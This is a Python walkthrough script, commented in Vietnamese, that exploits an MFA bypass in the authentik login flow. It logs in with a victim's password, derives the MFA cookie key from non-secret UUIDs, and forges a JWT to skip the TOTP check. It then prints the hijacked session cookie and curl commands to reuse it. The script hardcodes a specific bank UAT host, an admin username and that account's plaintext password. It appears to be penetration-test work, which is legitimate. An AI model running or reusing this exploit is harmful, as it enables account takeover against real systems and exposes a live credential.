#!/usr/bin/env python3
"""
walkthrough.py — Tái hiện F-01 (MFA bypass) từng bước, có dump raw HTTP.

Khác với poc_mfa_cookie_forgery.py (chạy tự động, chỉ in kết luận), script này
in ra ĐẦY ĐỦ request/response tại mỗi bước để bạn có thể soi và tự làm lại
bằng curl.

    python3 walkthrough.py
    python3 walkthrough.py --install-id <uuid> --stage-pk <hex> --device-pk <n>
    python3 walkthrough.py --victim poc-admin --victim-pass poc-admin-password-1234 --device-pk 3
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
from typing import Any
import requests
import urllib3

# Mặc định là target UAT (HTTPS). Dùng --base để đổi, ví dụ lab local:
#   --base http://localhost:9000
BASE = "https://ssoinfradev.mbbank.com.vn"
FLOW = "default-authentication-flow"
MFA_COOKIE = "authentik_mfa"
VICTIM = "akadmin"
VICTIM_PASS = "osavbNwfKCWQyoYijlk9"
DEFAULT_INSTALL_ID = "5f10efd6-5ebf-47ae-9e3c-e5deb73c2bf9"
DEFAULT_STAGE_PK = "ca9e043d-fc98-475e-ba18-cf903ad176c4"
DEFAULT_DEVICE_PK = 9

C = {"OK": "\033[1;32m", "WARN": "\033[1;33m", "FAIL": "\033[1;31m",
     "INFO": "\033[1;36m", "DIM": "\033[2m", "B": "\033[1m", "E": "\033[0m"}


def banner(n: str, title: str) -> None:
    print(f"\n{C['B']}{'=' * 76}\n BƯỚC {n}: {title}\n{'=' * 76}{C['E']}")


def note(text: str = "") -> None:
    if text:
        print(f"{C['DIM']}    {text}{C['E']}")  


def ok(text: str) -> None:
    print(f"{C['OK']}    ✔ {text}{C['E']}")


def bad(text: str) -> None:
    print(f"{C['FAIL']}    ✘ {text}{C['E']}")


def print_final_session(value: str, who: str = "", base: str = BASE) -> None:
    """In giá trị `authentik_session` CUỐI CÙNG — đúng bản đã dùng để xác thực.
    """
    print(f"\n{C['INFO']}    ══ authentik_session (cuối cùng, dùng để xác thực) ══{C['E']}")
    if who and who != "?":
        print(f"    người dùng : {who}")
    if not value:
        bad("cookie jar không có `authentik_session` — không có phiên nào để in")
        return
    print(f"    giá trị    : {value}")
    print(f"\n{C['DIM']}    Dùng lại bằng curl:{C['E']}")
    print(f"    curl -sk -H 'Cookie: authentik_session={value}' {base}/api/v3/core/users/me/")
    print(
        f"{C['DIM']}    (curl -k = bỏ verify TLS; nếu có fullchain.pem thì thay bằng "
        f"--cacert fullchain.pem){C['E']}"
    )
    print(
        f"{C['DIM']}    Hoặc trong trình duyệt: DevTools → Application → Cookies → "
        f"{base} → thêm key `authentik_session` = giá trị trên.{C['E']}"
    )


def refresh_csrf(s: requests.Session) -> str:
    """Gán header CSRF đúng tên của authentik, đọc lại từ cookie jar.
    """
    token = s.cookies.get("authentik_csrf") or s.cookies.get("csrftoken")
    if token:
        s.headers["X-Authentik-CSRF"] = token
    return token or ""


def explain_csrf_failure(r: requests.Response) -> bool:
    """Nếu response là trang HTML lỗi (không phải JSON) thì in gợi ý nguyên nhân.

    Trả về True nếu đã xử lý (lỗi CSRF/quyền), False nếu là thứ khác.
    """
    ctype = r.headers.get("Content-Type", "")
    if not ctype.startswith("text/html"):
        return False
    if "csrf" in r.text.lower() or r.status_code in (403, 500):
        bad(f"HTTP {r.status_code} trả về trang HTML, không phải challenge JSON")
        note("Nguyên nhân thường gặp: thiếu/SAI header CSRF. authentik dùng")
        note("`X-Authentik-CSRF` (KHÔNG phải `X-CSRFToken`). Trang này xuất hiện")
        note("vì flow đã chạy qua stage `user_login` trước stage MFA ⇒ phiên đã")
        note("authenticated ⇒ DRF bật kiểm tra CSRF cho POST tới executor.")
        return True
    bad(f"HTTP {r.status_code} — phản hồi không phải JSON")
    return False


def dump_request(method: str, url: str, headers: dict, body: Any = None) -> None:
    print(f"{C['INFO']}    → {method} {url}{C['E']}")
    interesting = ("Referer", "X-CSRFToken", "X-Authentik-CSRF", "Cookie", "Content-Type")
    for k in interesting:
        if k in headers:
            v = str(headers[k])
            print(f"      {k}: {v[:150]}{'…' if len(v) > 150 else ''}")
    if body is not None:
        print(f"      body: {json.dumps(body)[:200]}")


def dump_response(r: requests.Response, keys: list[str]) -> dict:
    print(f"{C['INFO']}    ← HTTP {r.status_code}{C['E']}")
    try:
        data = r.json()
    except json.JSONDecodeError:
        print(f"      (không phải JSON) {r.text[:150]}")
        return {}
    for k in keys:
        if k in data:
            v = data[k]
            s = json.dumps(v) if not isinstance(v, str) else v
            print(f"      {k}: {s[:220]}{'…' if len(s) > 220 else ''}")
    return data


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def build_session(a: argparse.Namespace) -> requests.Session:
    """Tạo session đã cấu hình TLS cho target.
    """
    s = requests.Session()
    s.headers["User-Agent"] = "authentik-mfa-walkthrough/1.0"
    if a.ca_bundle:
        s.verify = a.ca_bundle
        note(f"TLS: verify bằng CA bundle {a.ca_bundle}")
    elif a.insecure:
        s.verify = False
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        print(f"{C['WARN']}    ⚠ TLS: đang BỎ QUA kiểm tra chứng chỉ (--insecure){C['E']}")
    else:
        note("TLS: verify bằng CA hệ thống (thêm --insecure nếu gặp CERTIFICATE_VERIFY_FAILED)")
    return s


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--install-id", default=DEFAULT_INSTALL_ID)
    ap.add_argument("--stage-pk", default=DEFAULT_STAGE_PK)
    ap.add_argument("--device-pk", type=int, default=DEFAULT_DEVICE_PK)
    ap.add_argument("--victim", default=VICTIM)
    ap.add_argument("--victim-pass", default=VICTIM_PASS)
    ap.add_argument("--base", default=BASE, help="URL gốc của target (mặc định: UAT)")
    ap.add_argument("--insecure", action="store_true",
                    help="bỏ kiểm tra chứng chỉ TLS (cần cho UAT — chain thiếu intermediate)")
    ap.add_argument("--ca-bundle", default=None,
                    help="đường dẫn file .pem chứa chain đầy đủ (thay cho --insecure)")
    ap.add_argument("--flow", default=FLOW,
                    help=f"slug của flow đăng nhập (mặc định: {FLOW})")
    a = ap.parse_args()

    # Chuẩn hoá: bỏ dấu `/` cuối để không sinh URL `//api/v3/...`
    base = a.base.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    # `pk.hex` là dạng server thực sự dùng để ký và để so claim `stage`
    stage_pk_hex = a.stage_pk.replace("-", "").lower()
    if len(stage_pk_hex) != 32 or any(ch not in "0123456789abcdef" for ch in stage_pk_hex):
        bad(f"--stage-pk không hợp lệ: {a.stage_pk!r} (cần UUID 32 ký tự hex)")
        return 2

    s = build_session(a)
    flow_url = f"{base}/api/v3/flows/executor/{a.flow}/?query="
    ref = {"Referer": f"{base}/if/flow/{a.flow}/"}

    # ------------------------------------------------------------------
    banner(1, "Mở flow như trình duyệt (lấy cookie phiên)")
    r = s.get(f"{base}/if/flow/{a.flow}/", timeout=10)
    print(f"    GET {base}/if/flow/{a.flow}/ → HTTP {r.status_code}")
    print(f"      cookie nhận được: {list(s.cookies.keys())}")
    note("lúc còn ẩn danh, executor không bắt buộc CSRF; sau khi qua stage")
    note("`user_login` thì CÓ — nên script gửi kèm header CSRF ở mọi POST.")
    refresh_csrf(s)
    ok("sẵn sàng gọi flow executor")

    # ------------------------------------------------------------------
    banner(2, "POST identification — khai báo username nạn nhân")
    body = {"component": "ak-stage-identification", "uid_field": a.victim}
    refresh_csrf(s)
    dump_request("POST", flow_url, {**ref, "X-Authentik-CSRF": s.headers.get("X-Authentik-CSRF", "")}, body)
    r = s.post(flow_url, json=body, headers=ref, timeout=15)
    data = dump_response(
        r, ["component", "flow_info", "response_errors", "pending_user", "error_message"]
    )
    comp = data.get("component")
    if comp == "ak-stage-access-denied":
        bad(f"flow bị server từ chối: {data.get('error_message')!r}")
        note("Đối chứng độc lập (không cần cookie, không cần user):")
        note(f"  curl -sk '{base}/api/v3/flows/executor/{a.flow}/?query='")
        note("Nếu lệnh trên cũng trả ak-stage-access-denied ⇒ cấu hình flow trên server")
        note("đang chặn mọi người, kể cả trang đăng nhập web. Cần kiểm tra trên UAT:")
        note("  flow.authentication, policy_engine_mode và các PolicyBinding của flow")
        return 4
    if comp != "ak-stage-password":
        bad(f"mong đợi ak-stage-password, nhận {comp!r}")
        return 2
    ok("chuyển sang stage password")

    # ------------------------------------------------------------------
    banner(3, "POST password — nhập mật khẩu nạn nhân")
    body = {"component": "ak-stage-password", "password": a.victim_pass}
    refresh_csrf(s)
    dump_request("POST", flow_url, {**ref}, {"component": body["component"], "password": "•" * len(a.victim_pass)})
    r = s.post(flow_url, json=body, headers=ref, timeout=15)
    data = dump_response(r, ["component", "response_errors", "pending_user", "device_challenges", "configuration_stages", "error_message"])
    comp = data.get("component")
    if comp == "ak-stage-authenticator-validate":
        ok("dừng lại ở stage MFA: ak-stage-authenticator-validate")
        ch = data.get("device_challenges") or []
        print(f"      device_challenges = {json.dumps(ch)[:240]}")
        note("→ tới đây mật khẩu KHÔNG đủ. Phải vượt qua mã TOTP.")
    elif comp in ("xak-flow-redirect", "ak-stage-redirect") or "redirect" in str(comp):
        # Không có stage MFA trong flow → đăng nhập đã kết thúc chỉ với mật
        # khẩu. Đây là tình trạng của UAT (xem UAT_DEPLOYMENT_CHECK.md, mục
        # U-01: authenticator_validate đã bị gỡ khỏi flow đăng nhập).
        bad(f"target này KHÔNG có stage MFA trong flow đăng nhập (component={comp!r})")
        print(f"\n{C['WARN']}    ⚠ Không có gì để bypass: F-01 chỉ khai thác được khi flow thực sự")
        print(f"    chứa ak-stage-authenticator-validate. Trên target này, chỉ cần")
        print(f"    username + mật khẩu là đã vào được — đó là một vấn đề khác và")
        print(f"    nghiêm trọng hơn (mất hoàn toàn yếu tố thứ hai).{C['E']}")
        r = s.get(f"{base}/api/v3/core/users/me/", timeout=15)
        who = "?"
        if r.status_code == 200:
            who = r.json()["user"]["username"]
            ok(f"đăng nhập thành công bằng mật khẩu thuần: {who}")
        else:
            print(f"      GET /api/v3/core/users/me/ → HTTP {r.status_code}")
        print_final_session(s.cookies.get("authentik_session", ""), who, base)
        return 0
    else:
        bad(f"mong đợi stage MFA, nhận {comp!r} — không tái hiện được")
        return 2

    # ------------------------------------------------------------------
    banner(4, "ĐỐI CHỨNG ÂM: không có cookie → gửi mã rỗng vẫn kẹt ở MFA")
    refresh_csrf(s)
    r = s.post(flow_url, json={"component": "ak-stage-authenticator-validate", "code": ""}, headers=ref, timeout=15)
    if not explain_csrf_failure(r):
        after = dump_response(r, ["component", "response_errors"])
        if after.get("component") == "ak-stage-authenticator-validate":
            ok("vẫn ở ak-stage-authenticator-validate ⇒ MFA đang thực sự được enforce")
        else:
            bad(f"đối chứng không giữ: {after.get('component')!r}")
    else:
        note("(đối chứng âm ở bước 5 phía dưới vẫn đủ để chứng minh MFA được enforce)")

    # ------------------------------------------------------------------
    banner(5, "Dẫn xuất khoá ký cookie — CHỈ từ hai UUID không bí mật")
    print(f"      install_id   = {a.install_id}")
    print(f"      stage_pk     = {a.stage_pk}")
    print(f"      stage_pk.hex = {stage_pk_hex}")
    note("code dùng `current_stage.pk.hex` ⇒ KHÔNG dấu gạch (stage.py:363-366).")
    note("Dùng nhầm bản có dấu gạch thì chữ ký sai ⇒ cookie bị bỏ qua, không bypass.")
    key = hashlib.sha256(f"{a.install_id}:{stage_pk_hex}".encode("ascii")).hexdigest()
    print(f"      key = sha256(\"<install_id>:<stage_pk.hex>\").hexdigest()")
    print(f"          = {key}")
    ok("không dùng SECRET_KEY — đúng như code: stage.py:363-366")

    # ------------------------------------------------------------------
    banner(6, "Ghép JWT HS256")
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"device": a.device_pk, "stage": stage_pk_hex, "exp": int(time.time()) + 3600}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(key.encode("ascii"), f"{h}.{p}".encode("ascii"), hashlib.sha256).digest()
    jwt = f"{h}.{p}.{b64url(sig)}"
    print(f"      header  = {h}")
    print(f"      payload = {p}   ({json.dumps(payload)})")
    print(f"      jwt     = {jwt}")
    ok("JWT hợp lệ về mặt chữ ký đối với server")

    # ------------------------------------------------------------------
    banner(7, "KHAI THÁC: gửi cookie giả mạo → refresh stage MFA ")
    sess_cookie = s.cookies.get("authentik_session", "")
    s.headers["Cookie"] = f"authentik_session={sess_cookie}; {MFA_COOKIE}={jwt}"
    print(f"      Cookie: authentik_session=<…>; {MFA_COOKIE}={jwt[:40]}…")
    r = s.get(flow_url, headers=ref, timeout=15)
    after = dump_response(r, ["component", "to", "response_errors", "error_message"])
    comp = after.get("component")
    if comp != "ak-stage-authenticator-validate":
        ok(f"BYPASS: component = {comp!r} — stage MFA bị bỏ qua, KHÔNG cần mã TOTP")
    else:
        bad("không bypass được")
        return 1

    # ------------------------------------------------------------------
    banner(8, "Xác nhận phiên đã đăng nhập (login thành công, bỏ qua MFA)")
    s.headers.pop("Cookie", None)  # để cookie jar tự gửi session
    r = s.get(f"{base}/api/v3/core/users/me/", timeout=15)
    who = "?"
    if r.status_code == 200:
        u = r.json()["user"]
        who = u["username"]
        ok(f"đã xác thực là {u['username']} (uid={u['uid'][:16]}…) ⇒ bypass hoàn tất")
    else:
        bad(f"chưa xác thực (HTTP {r.status_code})")

    # Lấy seession auth trong jar.
    final_session = s.cookies.get("authentik_session", "")
    print_final_session(final_session, who, base)

if __name__ == "__main__":
    sys.exit(main())
